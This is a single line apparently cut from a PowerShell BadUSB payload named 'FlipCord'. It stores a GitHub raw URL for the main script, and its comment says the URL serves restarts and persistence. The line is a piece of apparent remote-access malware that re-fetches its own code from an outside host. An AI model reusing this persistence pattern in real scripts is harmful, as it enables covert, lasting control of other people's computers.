...
$global:parent = "https://raw.githubusercontent.com/MrVohi/BadFlipper/refs/heads/main/Remote/FlipCord/main.ps1" # parent script URL (for restarts and persistance)
